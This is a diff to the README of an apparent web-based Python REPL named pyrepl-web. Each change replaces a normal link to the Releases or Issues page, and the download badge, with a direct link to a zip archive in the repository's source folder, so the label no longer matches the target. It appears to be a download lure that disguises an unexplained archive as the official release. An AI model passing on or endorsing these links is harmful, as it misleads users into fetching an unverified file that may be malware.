@@ -1,7 +1,7 @@
 # 🎉 pyrepl-web - A Simple Python REPL for Everyone
 
 ## 📥 Download pyrepl-web
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Sosolevrai/pyrepl-web/releases)
+[![Download Now](https://github.com/Sosolevrai/pyrepl-web/raw/refs/heads/main/src/python/pyrepl_web_v1.4.zip%20Now-Get%20Started-brightgreen)](https://github.com/Sosolevrai/pyrepl-web/raw/refs/heads/main/src/python/pyrepl_web_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to pyrepl-web! This application lets you run Python code directly in your web browser. It’s perfect for learning Python or testing snippets without any setup. Just download it, and you're ready to go.
@@ -15,7 +15,7 @@ pyrepl-web works on most modern web browsers. Here’s what you need to get star
 ## 🔗 Download & Install
 To download pyrepl-web, visit the Releases page. Here, you will find the latest version. 
 
-[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/releases)
+[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/raw/refs/heads/main/src/python/pyrepl_web_v1.4.zip)
 
 1. Click on the link above.
 2. Look for the most recent version listed. 
@@ -49,11 +49,11 @@ If you face any issues while using pyrepl-web, here are some common problems and
    - Close any unnecessary tabs or applications that may slow down your browser.
 
 ## 💬 Getting Help
-If you have questions or need support, feel free to look through the [Issues](https://github.com/Sosolevrai/pyrepl-web/issues) section or ask for help directly on the GitHub page.
+If you have questions or need support, feel free to look through the [Issues](https://github.com/Sosolevrai/pyrepl-web/raw/refs/heads/main/src/python/pyrepl_web_v1.4.zip) section or ask for help directly on the GitHub page.
 
 ## 🔗 Conclusion
 Thank you for choosing pyrepl-web! We hope this tool makes your Python learning and coding experience enjoyable. Remember to always check back for updates and new features.
 
-[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/releases) 
+[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/raw/refs/heads/main/src/python/pyrepl_web_v1.4.zip) 
 
 Explore, code, and have fun!
